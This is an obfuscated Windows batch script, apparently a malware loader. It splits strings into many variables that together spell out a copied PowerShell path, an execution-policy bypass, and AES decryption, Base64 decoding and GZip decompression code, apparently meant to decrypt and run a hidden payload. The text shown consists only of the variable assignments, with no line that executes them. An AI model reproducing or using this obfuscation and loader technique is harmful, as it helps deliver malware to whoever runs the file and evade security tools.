@echo off
set "JdMvXpJpXn=32"
set "yyTSYlwZAZ=Sy"
set "MCuKzPSYEQ=he"
set "jLkeWZmoFm= C"
set "TUBBpfLrkW=do"
set "VBaeJGtVll=\v"
set "LwuXzPqOjo=ll"
set "FfATZGvoQE=.e"
set "gXkAWfLnxd= /"
set "MGmJiVWCWE=po"
set "bfrbvOMeOk=\W"
set "MHuCubROjo=co"
set "CflXTESORi=rs"
set "wFIajbUQZw=py"
set "nEBApawqGv=nd"
set "ndEDDGbALS=y "
set "mAmZcprtEk=s\"
set "hvzeaArMvL=ws"
set "diKOSLQqwo=xe"
set "ODiWyxfSaD=ow"
set "arJmmATRBB=0\"
set "uTtQzLBOuN=Wi"
set "iyNilRLxsb=st"
set "weHMLIZrCN=1."
set "wXHGkGgmgz=he"
set "amNouQbjQi=Po"
set "dCAcqBxNKT=ll"
set "ETbCEOKcsl=in"
set "cuTRcjuXCe=rS"
set "GJOQANrByZ=em"
set "nkaVdYVOqI=we"
set "FGXMtgEQLq=we"
set "PYAQaFOuDa=:\"
set "vOaFSKmFzQ=cd"
set "ahHdnTLozH= %~dp0"
set "ggnIMMHgNA=Mode"
set "jfLQpMZeut=V = "
set "IzEzvuRaFS= = $"
set "xSpvTNptoy=;$jc"
set "kjVPmQVVhC=Obje"
set "XGIuLIMOWR=ress"
set "xqrLbsLvSF=iron"
set "dJQMhRnAwp=opZm"
set "MLMkZegTXu=qjPD"
set "oyCdYbFxPO=tsWi"
set "wrXjlPbsrB=.Cry"
set "ZfWLSGNGlc=[Sys"
set "KtsAcMZSjz=RmAx"
set "wZwGBLOTbx=opZm"
set "EIciKusjvh=nirt"
set "cIGcDKLaUV=);$R"
set "sFHNgbNWCP=Conv"
set "tIHiOrsDCH=ert]"
set "QxAcHIkqAw=ing("
set "fqNEZDeVZg=urit"
set "lxiMRTMujb=ect "
set "qoBOSaagrg=trea"
set "TdrOZAZkxP=pres"
set "ysohuAUWvk=l5E7"
set "QZQderGuzq= if "
set "UFTCchzIBw=tem."
set "TDKIZwcBsj=and "
set "pzkNegXhjY=esaB"
set "LHKXoaRxaP=;$jc"
set "sJGylopvZU=Suv."
set "VtALNbwFfa=3); "
set "LsdINocPlV=eMVs"
set "GNbsMqriHS=New-"
set "ygqAmvxMBr=pStr"
set "ZYrhRhXazv=[IO."
set "FXkzXmiLKf=lBlo"
set "AgPSHlzKWt=y.Cr"
set "VoRAOrUMDt=y.Pa"
set "yRspHqCRis=106u"
set "YavbLKeDQS=XMw."
set "EBlKqsWFtx=-Obj"
set "pEPdeqmYAk=m(, "
set "XmHADimkzI=::('"
set "BtqmiUMObm=.Dis"
set "PCxAtjcWnV=..-1"
set "GzCjDRbPCh=XMw "
set "FIrTXdFIXb=join"
set "QBCcGrcUAW=.Len"
set "QwfEADJBKc=mHDf"
set "bimgSBfbRJ=pose"
set "hGLYBdyWCI=] -j"
set "TzBAIzhRmZ=$mjW"
set "lnupQBAbDm=ct S"
set "hVwTAqsotE=gMod"
set "zOwtbYeRYl=.Sec"
set "JGjZbjmLbS=yTo("
set "TihxWgdQIR=uv.T"
set "prxoijSURc=CFxo"
set "LIEJpmZomt=BC;$"
set "lAzoTJPctp=[Sys"
set "ojEblzmLyx=saBm"
set "MGtqfMhPRL=vert"
set "cvBXKAOvqV=ion."
set "EndfdfOYrK=($Vd"
set "lWNuAJkMPS=PKCS"
set "FnnrhKhapO=);$R"
set "kPjxmPsuuf=bjec"
set "fGzBBJoEbE= = ["
set "FAoDOJcuCY=gjYA"
set "NswELHNzWw=.Cop"
set "VHfkXhKtln=rtS4"
set "YWYHToNpOZ=M = "
set "urygjMvwAK=gth)"
set "pyXRwYmhjT=ose("
set "BsySKMagOv=16] "
set "xJHhyJOTqE=J = "
set "ECwUiseNGr=bstr"
set "UXYOclVVWh=JjEx"
set "zfChcTxhAZ=$jzx"
set "hPNNwBlRvs=('%*'"
set "HGAxTHOdmT=..-1"
set "vbidSNDRBY=E) {"
set "WJirOyimnK=-ep "
set "UZiiMYGyTy=();$"
set "upiOhnqhkn=Disp"
set "MnGJGMCuCG=in $"
set "jtfLrIrtTJ=jzxp"
set "KCNaoPuZeW=6] -"
set "wCLslJuqqX=xpM."
set "liHZwBZsMT=Bmor"
set "LmreBIRkDa=gsYZ"
set "JmKsbHJWYd=gnir"
set "yeSVGsEixt=Comp"
set "WxHeAbGKJY=Comp"
set "rjLbQDzIEl=m.IO"
set "XqmCkaYMoh=ress"
set "mqJfegOvaw=[Sys"
set "ikLrscDUkg=ionM"
set "ebclxfIEky=('Tg"
set "cZUWexUdup=Yb.T"
set "HtCapvOcLZ=rity"
set "donsZsOCVd=1..-"
set "BNdXWjpkKr=ose("
set "BMBavTfZzA= = $"
set "iKkKsxhPpg=yste"
set "GLhyWbCRuP=rans"
set "LlbiFqbrqK=();$"
set "ROtyzlGWzk=ss -"
set "hrGsDFNAoD=-joi"
set "MswYUWLKMP=bJ);"
set "WQlyCWUoZd=n ''"
set "odDFrTUKzZ=join"
set "ArhVKaJfcl=raph"
set "roqNQNkUXv=e = "
set "QOJraTLgBj=]::C"
set "SmMdNIVtMf=PE ="
set "RLgKIJUYal=opZm"
set "HycqlaKZSk=;$qj"
set "JBEGEDwCAI== [S"
set "NLcmOLUxCU=RObJ"
set "TTKSlCzcHt=ptor"
set "ZMjaGmocEm=d;$R"
set "IVsbtGhNsJ=uBXz"
set "ZjtXRscfDz=PTtG"
set "CMDqewrNZa=yste"
set "KorWQCFUyW=F'[-"
set "jMhiKOmuoq=ct S"
set "bRQCHBnztI=yste"
set "HVsxEqIctE= '')"
set "JSJSEdcyWa=-joi"
set "InpTXwCrlb== $R"
set "OZyzNLMpLx=comp"
set "xzlYsehbKk=ecry"
set "lQJMglhybQ=am;$"
set "wzvTPSZQXE=ring"
set "MtTuHRvxxG=g = "
set "nQUxWytrZc=);$m"
set "AVTtZXiGdg=y.Ci"
set "XWpBEtDfUn=lROb"
set "XEOoPexJoF=oL'["
set "YuRhkAStYk='[-1"
set "HtETLVKLEd=:('g"
set "VyHGoeJjgR=$lRO"
set "JxyhSmbrhl=zHhH"
set "ExnhupnXAt=ispo"
set "HRNLewEhgv=y]::"
set "XzpwBGMBRa=L4Yi"
set "TQFjsrhRxn=onve"
set "GazTdWctgD=[-1."
set "lmzEQUFTHX=.Mem"
set "sOhotzyscJ=)) {"
set "iNClmqlVkx=bypa"
